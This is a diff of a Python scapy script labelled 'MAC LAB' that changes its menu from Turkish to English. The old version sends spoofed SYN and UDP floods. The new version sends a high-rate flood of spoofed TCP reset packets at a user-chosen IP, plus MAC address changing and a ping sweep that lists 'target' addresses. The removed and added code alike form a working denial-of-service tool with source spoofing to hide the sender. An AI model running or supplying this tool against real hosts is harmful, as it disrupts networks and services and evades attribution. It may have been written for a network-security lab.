@@ -1,133 +1,148 @@
 import subprocess
-import re
 import random
-import string
-import socket
 import threading
-import time
+import re
+import ipaddress
+import logging
+import sys
 from scapy.all import *
 
+DEFAULT_SPEED = 5000  
+packet_counter_lock = threading.Lock()
+packet_counter = 0
+
 def get_random_mac_address():
-    mac_parts = [format(random.randint(0x00, 0xff), '02x') for _ in range(6)]
-    return ':'.join(mac_parts)
+    return ':'.join(format(random.randint(0x00, 0xff), '02x') for _ in range(6))
 
-def change_mac_address(interface, new_mac):
-    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "down"])
-    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "address", new_mac])
-    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "up"])
+def random_ip_generator():
+    return '.'.join(str(random.randint(0, 255)) for _ in range(4))
 
-def change_mac_and_print(interface):
-    new_mac_address = get_random_mac_address()
-    change_mac_address(interface, new_mac_address)
-    print(f"\nMAC adresi başarıyla değiştirildi. Yeni MAC adresi: {new_mac_address}")
+def random_port_generator():
+    return random.randint(1500, 65530)
 
 def list_network_interfaces():
     try:
         result = subprocess.check_output(['ip', 'link'], universal_newlines=True)
         return result
     except subprocess.CalledProcessError as error:
-        return ("Hata Kodu: " + str(error.returncode), "\n Hata Çıktısı: " + str(error.output), "\nİnterface'ler Listelenemedi.")
+        print(f"Error code: {error.returncode}")
+        print(f"An error occurred: {error.output}")
+        return None
+
+def reset_network_interface(interface):
+    try:
+        subprocess.check_output(["ip", "link", "set", "dev", interface, "down"])
+        print(f"{interface} interface has been brought down.")
+        
+        subprocess.check_output(["ip", "link", "set", "dev", interface, "up"])
+        print(f"{interface} interface has been brought up.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while resetting the interface: {e}")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
 
 def select_network_interface():
     interfaces = list_network_interfaces()
-    print("Mevcut İnterface'ler:")
+    if interfaces is None:
+        print("Interfaces could not be listed.")
+        return None
+
+    print("Available Interfaces:")
     interface_list = re.findall(r'^\d+: (\S+):', interfaces, re.MULTILINE)
     for i, interface in enumerate(interface_list, 1):
         print(f"{i}. {interface}")
 
     while True:
         try:
-            selection = int(input("İnterface seçin (1 - n): "))
+            selection = int(input("Select an interface (1 - n): "))
             if 1 <= selection <= len(interface_list):
                 return interface_list[selection - 1]
             else:
-                print("Geçersiz bir seçenek girdiniz. Lütfen doğru sayı girin.")
+                print("Invalid selection. Please choose a valid number.")
         except ValueError:
-            print("Geçersiz bir giriş. Lütfen bir sayı girin.")
+            print("Invalid input. Please enter a number.")
 
-def generate_random_data(packet_size):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=packet_size))
+def generate_packets(target_ip, packet_count):
+    packets = []
+    for _ in range(packet_count):
+        smac = get_random_mac_address()
+        dmac = get_random_mac_address()
+        sip = random_ip_generator()
+        dip = target_ip
+        sport = random_port_generator()
+        dport = random_port_generator()
 
-def random_ip_generator():
-    return '.'.join(str(random.randint(0, 255)) for _ in range(4))
+        tcp_packet = Ether(src=smac, dst=dmac) / \
+                     IP(src=sip, dst=dip) / \
+                     TCP(sport=sport, dport=dport, flags='R', options=[('Timestamp', (0, 0))])
+        packets.append(tcp_packet)
+    return packets
 
-def random_port():
-    return random.randint(1, 65535)
+def send(pkts, iface=None, speed=DEFAULT_SPEED):
+    try:
+        sendpfast(pkts, iface=iface, pps=speed)
+        print("Packets successfully sent.")
+    except Exception as e:
+        print(f"Packets could not be sent. Error: {e}")
 
-def packet_size():
-    return random.randint(50, 1350)
+def perform_attack(target_ip, packet_count, iface):
+    packets = generate_packets(target_ip, packet_count)
+    send(packets, iface, DEFAULT_SPEED)
 
-def send_packets_thread(packets):
-    sendp(packets, verbose=False)
+def change_mac(interface, new_mac):
+    try:
+        subprocess.check_output(["ip", "link", "set", "dev", interface, "down"])
+        subprocess.check_output(["ip", "link", "set", "dev", interface, "address", new_mac])
+        subprocess.check_output(["ip", "link", "set", "dev", interface, "up"])
+        print(f"{interface} interface's MAC address has been changed to {new_mac}.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while changing MAC address: {e}")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
 
-def send_syn_packet(target_ip, packet_count):
-    start_time = time.time()
-    conf.verb = 0
-    arp_request = ARP(op=1, pdst=target_ip)
-    arp_response = sr1(arp_request, timeout=1, verbose=0)
 
-    if arp_response:
-        target_mac = arp_response.hwsrc
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+conf.verb = 0
 
-        packets = []
-        for _ in range(packet_count):
-            source_ip = random_ip_generator()
-            source_port = random_port()
-            target_port = random_port()
+def list_target_ips(network='192.168.1.0/24', stop_event=None):
+    try:
+        net = ipaddress.ip_network(network)
+        live_ips = []
 
-            tcp_packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
-            data = generate_random_data(packet_size())
-            tcp_packet = tcp_packet / Raw(load=data)
-            packets.append(tcp_packet)
+        print("IP Scanning... Press 'q' and Enter to stop scanning.")
 
-            if len(packets) >= 100:
-                t = threading.Thread(target=send_packets_thread, args=(packets,))
-                t.start()
-                packets = []
+        for ip in net.hosts():
+            if stop_event and stop_event.is_set():
+                break
+            response = sr1(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0)
+            if response:
+                live_ips.append(str(ip))
+                print(f"Found IP: {ip}")
 
-        if packets:
-            t = threading.Thread(target=send_packets_thread, args=(packets,))
-            t.start()
+        if not live_ips:
+            print("No live IP addresses found in the network.")
+            
+        print("\nIP scanning completed.")
+        
+        return live_ips
 
-        end_time = time.time()
-        total_time = end_time - start_time
-        print(f"{packet_count} adet SYN paketi {total_time} saniyede {target_ip} adresine gönderildi.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return None
 
-def send_udp_packet(target_ip, packet_count):
-    start_time = time.time()
-    conf.verb = 0
-    arp_request = ARP(op=1, pdst=target_ip)
-    arp_response = sr1(arp_request, timeout=1, verbose=0)
-
-    if arp_response:
-        target_mac = arp_response.hwsrc
-
-        packets = []
-        for _ in range(packet_count):
-            source_ip = random_ip_generator()
-            source_port = random_port()
-            target_port = random_port()
-
-            udp_packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port)
-            data = generate_random_data(packet_size())
-            udp_packet = udp_packet / Raw(load=data)
-            packets.append(udp_packet)
-
-            if len(packets) >= 100:
-                t = threading.Thread(target=send_packets_thread, args=(packets,))
-                t.start()
-                packets = []
-
-        if packets:
-            t = threading.Thread(target=send_packets_thread, args=(packets,))
-            t.start()
-
-        end_time = time.time()
-        total_time = end_time - start_time
-        print(f"{packet_count} adet UDP paketi {total_time} saniyede {target_ip} adresine gönderildi.")
+def monitor_keyboard(stop_event):
+    while not stop_event.is_set():
+        user_input = input()
+        if user_input.lower() == 'q':
+            print("Stopping IP scan...")
+            stop_event.set()
+            break
 
 def print_mac_lab_art():
-    print("\n" + " " * 71)
+    GREEN = '\033[92m' 
+    RESET = '\033[0m'   
+
+    print(GREEN + "\n" + " " * 71)
     print("       .___  ___.      ___       ______  __          ___      .______   ")
     print("       |   \/   |     /   \     /      ||  |        /   \     |   _  \  ")
     print("       |  \  /  |    /  ^  \   |  ,----'|  |       /  ^  \    |  |_)  | ")
@@ -135,34 +150,78 @@ def print_mac_lab_art():
     print("       |  |  |  |  /  _____  \ |  `----.|  `----./  _____  \  |  |_)  | ")
     print("       |__|  |__| /__/     \__\ \______||_______/__/     \__\ |______/  ")
     print("                                           DR. Gokhan Akin & Latif Altay")
-    print(" " * 71)
+    print(" " * 71 + RESET)
+
+def is_valid_ip(ip):
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
+def is_valid_network(network):
+    try:
+        ipaddress.ip_network(network)
+        return True
+    except ValueError:
+        return False
 
 def main():
-    while True:
-        print_mac_lab_art()
-        print("\n1. İnterfaceleri listele ve MAC adresini değiştir")
-        print("2. SYN Paketi Gönder")
-        print("3. UDP Flood Paketi Gönder")
-        print("4. Çıkış")
+    try:
+        while True:
+            print_mac_lab_art()
+            print("\n1. List interfaces and change MAC address")
+            print("2. Perform Attack")
+            print("3. List and select target IP addresses")
+            print("4. Reset network interfaces")
+            print("5. Exit")
 
-        choice = input("Seçiminizi yapın: ")
+            choice = input("Select an option: ")
+            print("")
 
-        if choice == '1':
-            interface = select_network_interface()
-            change_mac_and_print(interface)
-        elif choice == '2':
-            target_ip = input("Hedef IP adresini girin: ")
-            packet_count = int(input("Gönderilecek SYN paketi sayısını girin: "))
-            send_syn_packet(target_ip, packet_count)
-        elif choice == '3':
-            target_ip = input("Hedef IP adresini girin: ")
-            packet_count = int(input("Gönderilecek UDP paketi sayısını girin: "))
-            send_udp_packet(target_ip, packet_count)
-        elif choice == '4':
-            print("Programdan çıkılıyor...")
-            break
-        else:
-            print("Geçersiz seçenek. Lütfen tekrar deneyin.")
+            if choice == '1':
+                interface = select_network_interface()
+                if interface:
+                    new_mac = get_random_mac_address()
+                    change_mac(interface, new_mac)
+                print("")
+            elif choice == '2':
+                target_ip = input("Enter target IP address: ")
+                if is_valid_ip(target_ip):
+                    packet_count = int(input("Enter number of packets to send: "))
+                    iface = select_network_interface()
+                    if iface:
+                        perform_attack(target_ip, packet_count, iface)
+                else:
+                    print("Invalid IP address. Please enter a valid IP address.")
+                print("")
+            elif choice == '3':
+                network = input("Enter the network to scan (e.g., 192.168.1.0/24): ")
+                if is_valid_network(network):
+                    stop_event = threading.Event()
+                    keyboard_thread = threading.Thread(target=monitor_keyboard, args=(stop_event,))
+                    keyboard_thread.start()
+                    ips = list_target_ips(network, stop_event)
+                    if ips:
+                        print("Found IPs:", ips)
+                    keyboard_thread.join()
+                else:
+                    print("Invalid network. Please enter a valid network.")
+                print("")
+            elif choice == '4':
+                interface = select_network_interface()
+                if interface:
+                    reset_network_interface(interface)
+                print("")
+            elif choice == '5':
+                print("Exiting...")
+                break
+            else:
+                print("Invalid choice. Please select a valid option.")
+                print("")
 
-if __name__ == "__main__":
+    except KeyboardInterrupt:
+        print("\nProgram interrupted by user.")
+
+if __name__ == '__main__':
     main()
